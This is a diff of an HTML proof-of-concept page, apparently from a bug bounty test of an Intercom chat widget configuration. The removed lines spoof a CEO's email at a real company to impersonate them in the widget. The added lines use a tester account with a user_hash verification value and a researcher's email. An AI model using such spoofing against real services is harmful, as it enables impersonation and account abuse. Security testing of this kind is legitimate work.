@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Intercom Misconfig PoC</title>
+  <title>Intercom Authenticated PoC</title>
   <script>
     window.intercomSettings = {
       app_id: "ruf6zij9",
-      email: "ceo@linktree.com",   // spoofed
-      name: "CEO"
+      user_id: "b177b0da-9ae0-40a1-b003-3eb7b5b6fe17",
+      user_hash: "0ee442c4dc50ffe25a4484ee5da03b8ff4eabd20359f3f2d4f4b768d43ab0c73",
+      name: "testerh2",
+      email: "ameersayyad12+2@wearehackerone.com"
     };
   </script>
   <script>
@@ -26,7 +28,7 @@
           s.async = true;
           s.src = 'https://widget.intercom.io/widget/ruf6zij9';
           var x = d.getElementsByTagName('script')[0];
-          x.parentNode.insertBefore(s, x);
+          x.parentNode.insertBefore(s,x);
         };
         if (w.attachEvent) { w.attachEvent('onload', l); }
         else { w.addEventListener('load', l, false); }
@@ -35,6 +37,6 @@
   </script>
 </head>
 <body>
-  <h1>Intercom Widget Test</h1>
+  <h1>Intercom Widget Test (with valid user_hash)</h1>
 </body>
 </html>
